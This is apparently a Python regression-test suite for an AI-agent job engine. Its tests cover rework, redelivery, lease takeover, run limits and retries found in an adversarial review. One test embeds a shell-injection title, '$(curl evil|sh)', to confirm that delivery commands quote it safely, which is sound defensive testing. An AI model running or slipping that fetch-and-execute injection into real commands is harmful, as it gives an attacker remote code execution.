"""Regression tests for the engine bugs an adversarial review found (each named after its finding)."""

from __future__ import annotations

import datetime as dt
import json
import shlex
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from support import Driver, RepoCase, sh  # noqa: E402

from factory_core import util  # noqa: E402
from factory_core.store import Store  # noqa: E402
from factory_core.util import FactoryError  # noqa: E402


def blocked(text="Which tenant model?"):
    def write(entry, info):
        Path(info["output"]).write_text(f"STATUS: BLOCKED\n\n# Spec\n\n## Blocked\n{text}\n")
    return write


class ReworkTarget(RepoCase):
    """H1, M5: rework never skips a stage that has not finished, nor a required gate."""

    def test_blocked_spec_on_a_large_feature_is_specified_planned_and_gated_again(self):
        self.agents.hooks["spec"] = blocked()
        eng = self.engine()
        job = eng.new_job("Multi-tenant billing", workflow="feature", size="L")["id"]
        self.assertEqual(Driver(eng, self.agents).run(job)["need"], "blocked")
        self.agents.hooks.clear()
        action = eng.rework(job, "Single-tenant only.")
        self.assertEqual([e["step"] for e in action["entries"]], ["spec"])
        gate = Driver(eng, self.agents).run(job, action)
        self.assertEqual(gate["need"], "plan-approval", "the L job still stops for plan approval")
        self.assertEqual([c["step"] for c in self.agents.calls], ["spec", "spec", "plan"])
        done = Driver(eng, self.agents).run(job, eng.approve(job))
        self.assertEqual(done["outcome"], "merged")

    def test_rework_at_a_gate_reruns_the_last_stage_that_applies(self):
        self.write_config({"require_plan_approval": ["feature"]})
        eng = self.engine()
        job = eng.new_job("Greeting", workflow="feature", size="S")["id"]  # plan is skipped for S
        self.assertEqual(Driver(eng, self.agents).run(job)["need"], "plan-approval")
        action = eng.rework(job, "Use French")
        self.assertEqual([e["step"] for e in action["entries"]], ["spec"])
        self.assertIn("rework-1.md", action["entries"][0]["prompt"])
        self.assertEqual(Driver(eng, self.agents).run(job, action)["need"], "plan-approval")

    def test_rework_after_review_still_goes_back_to_build(self):
        self.agents.decision = "ESCALATE"
        eng = self.engine()
        job = eng.new_job("Deploy config", size="S")["id"]
        Driver(eng, self.agents).run(job)
        action = eng.rework(job, "Keep the old value")
        self.assertEqual([e["step"] for e in action["entries"]], ["build.r2/builder"])


class ReworkAfterDelivery(RepoCase):
    """H3: a delivered job's worktree is gone; rework recreates it before anyone works in it."""

    def test_branch_delivery_then_rework_recreates_the_worktree(self):
        self.write_config({"deliver": "branch"})
        eng = self.engine()
        job = eng.new_job("Greeting", size="S")
        done = Driver(eng, self.agents).run(job["id"])
        self.assertEqual(done["outcome"], "branch")
        self.assertFalse(Path(job["worktree"]).exists())
        action = eng.rework(job["id"], "Say hello in French too")
        again = Driver(eng, self.agents).run(job["id"], action)
        self.assertEqual(again["outcome"], "branch")
        builds = [c for c in self.agents.calls if c["step"].startswith("build.")]
        self.assertEqual(builds[-1]["step"], "build.r2/builder")
        self.assertIn("rework-1.md", builds[-1]["prompt"])

    def test_missing_working_directory_is_reported_as_such(self):
        from factory_core.paths import git

        with self.assertRaises(FactoryError) as err:
            git(["status"], self.tmp / "gone")
        self.assertIn("does not exist", str(err.exception))


class Redeliver(RepoCase):
    """H2: actions created during redelivery are saved; nothing is re-sent for a stopped or tampered job."""

    def test_takeover_then_redeliver_saves_what_it_issues(self):
        a = self.engine("A")
        job = a.new_job("x", size="S")["id"]
        action = a.next(job)
        a.done(job, action["step"], action["attempt"])  # spec issued, session A dies
        b = self.engine("B")
        nxt = b.resume(job, force=True)
        self.assertEqual((nxt["entries"][0]["step"], nxt["entries"][0]["attempt"]), ("spec", 2))
        saved = Store(self.paths).load(job)["steps"]["spec"]
        self.assertEqual((saved["status"], saved["attempt"]), ("issued", 2))
        self.agents.handle(nxt["entries"][0])
        self.assertEqual(b.done(job, "spec", 2)["result"], "valid")

    def test_redeliver_on_a_job_waiting_for_a_human_spawns_nothing(self):
        self.agents.decision = "ESCALATE"
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        Driver(eng, self.agents).run(job)
        self.assertEqual(eng.redeliver(job)["kind"], "human")

    def test_a_tampered_entry_is_never_re_sent(self):
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        action = eng.next(job)
        spawn = eng.done(job, action["step"], action["attempt"])["next"]
        self.assertEqual(spawn["entries"][0]["step"], "spec")
        entry_file = self.paths.job_dir(job) / "entries" / "spec.json"
        entry = json.loads(entry_file.read_text())
        entry["subagent_type"] = "general-purpose"
        entry_file.write_text(json.dumps(entry))
        again = eng.redeliver(job)
        self.assertEqual(again["entries"][0]["subagent_type"], "factory:product-analyst")
        self.assertEqual(again["entries"][0]["attempt"], 2, "the step was issued afresh, not re-sent")


class Limits(RepoCase):
    """M1: a batch is issued whole or not at all, and rework starts a fresh budget."""

    def test_limit_before_a_panel_leaves_no_orphaned_reviewers(self):
        self.write_config({"limits": {"max_agent_runs": 3}})
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        stop = Driver(eng, self.agents).run(job)
        self.assertEqual(stop["need"], "limit")
        steps = Store(self.paths).load(job)["steps"]
        self.assertEqual([s for s, v in steps.items() if v["status"] == "issued"], [])
        resumed = Driver(eng, self.agents).run(job, eng.rework(job, "carry on"))
        self.assertEqual(resumed.get("outcome") or resumed.get("need"), "limit",
                         "with a fresh budget of 3 the next batch runs, then stops again")
        self.assertGreater(Store(self.paths).load(job)["counters"]["agent_runs"], 3)


class Leases(RepoCase):
    """M2: resuming from the session that holds the job takes nothing over; a stale lease with running agents
    is never taken silently."""

    def test_resume_by_the_holder_keeps_running_agents(self):
        eng = self.engine("A")
        job = eng.new_job("x", size="S")["id"]
        action = eng.next(job)
        eng.done(job, action["step"], action["attempt"])
        self.assertEqual(eng.resume(job)["kind"], "wait")
        saved = Store(self.paths).load(job)
        self.assertEqual((saved["epoch"], saved["steps"]["spec"]["status"]), (1, "issued"))

    def test_stale_lease_with_issued_agents_needs_force(self):
        a = self.engine("A")
        job = a.new_job("x", size="S")["id"]
        action = a.next(job)
        a.done(job, action["step"], action["attempt"])
        later = dt.datetime.now(dt.timezone.utc) + dt.timedelta(minutes=30)
        util.set_clock(lambda: later)
        self.addCleanup(util.set_clock, None)
        with self.assertRaises(FactoryError) as err:
            self.engine("B").next(job)
        self.assertIn("--force", str(err.exception))


class Retries(RepoCase):
    """M3, M4: a retried builder is respawned with its problems, and still sees the rework note."""

    def test_round_two_retry_is_respawned_with_problems(self):
        self.agents.verdicts["security"] = ["CHANGES", "PASS"]
        self.agents.hooks["build.r2/"] = lambda entry, info: Path(info["output"]).write_text("not a build report\n")
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        driver = Driver(eng, self.agents)
        stop = driver.run(job)
        self.assertEqual(stop["need"], "limit", "two invalid attempts stop the job")
        self.assertIn("exhausted its 2 attempts", stop["reason"])
        r2 = [a for a in driver.actions if a.get("step") == "build.r2/builder"
              or any(e["step"] == "build.r2/builder" for e in a.get("entries", []))]
        by_attempt = {}
        for a in r2:
            attempt = a.get("attempt") or next(e["attempt"] for e in a["entries"] if e["step"] == "build.r2/builder")
            by_attempt.setdefault(attempt, a["kind"])
        self.assertEqual(by_attempt, {1: "message", 2: "spawn"}, "first a message, then a respawn")
        retry = [c for c in self.agents.calls if c["step"] == "build.r2/builder"][-1]
        self.assertEqual(retry["attempt"], 2)
        self.assertIn("rejected by the factory's contract check", retry["prompt"])
        self.assertIn("attempt=2", retry["prompt"].splitlines()[0])

    def test_rework_note_survives_a_retry(self):
        self.agents.decision = "ESCALATE"
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        Driver(eng, self.agents).run(job)
        action = eng.rework(job, "Keep the old value")
        entry = action["entries"][0]
        Path(entry["output"]).write_text("not a build report\n")
        retry = eng.done(job, entry["step"], entry["attempt"])["next"]
        self.assertEqual(retry["entries"][0]["attempt"], 2)
        self.assertIn("rework-1.md; read it first", retry["entries"][0]["prompt"])


class SmallOnes(RepoCase):
    def test_failed_setup_can_be_retried_with_resume(self):
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        action = eng.next(job)
        self.assertEqual(action["step"], "setup/deps")
        stop = eng.done(job, "setup/deps", action["attempt"], status="error", note="npm registry down")["next"]
        self.assertEqual(stop["need"], "blocked")
        retry = eng.resume(job)
        self.assertEqual((retry["kind"], retry["step"], retry["attempt"]), ("inline", "setup/deps", 2))

    def test_an_attempt_that_was_never_issued_is_stale(self):
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        action = eng.next(job)
        spawn = eng.done(job, action["step"], action["attempt"])["next"]
        self.agents.handle(spawn["entries"][0])
        self.assertEqual(eng.done(job, "spec", 7)["result"], "stale")
        self.assertEqual(eng.done(job, "spec", 1)["result"], "valid")

    def test_untracked_file_in_the_way_is_a_busy_checkout_not_a_conflict(self):
        eng = self.engine()
        job = eng.new_job("x", size="S")["id"]
        (self.repo / "feature.py").write_text("my scratch file\n")  # the branch adds feature.py
        stop = Driver(eng, self.agents).run(job)
        self.assertEqual(stop["need"], "merge-busy")
        self.assertIn("Untracked files", stop["reason"])

    def test_delivery_commands_quote_the_title(self):
        self.write_config({"deliver": "branch"})
        eng = self.engine()
        job = eng.new_job('Fix "x" $(curl evil|sh)', size="S")["id"]
        done = Driver(eng, self.agents).run(job)
        pr = done["commands"][1]
        title = shlex.split(pr)[shlex.split(pr).index("--title") + 1]
        self.assertEqual(title, 'Fix "x" $(curl evil|sh)', "the title reaches gh as one literal argument")
        self.assertNotIn(" $(curl", pr.replace("'", "").split("--title")[0])
        sh(["git", "log", "-1"], self.repo)
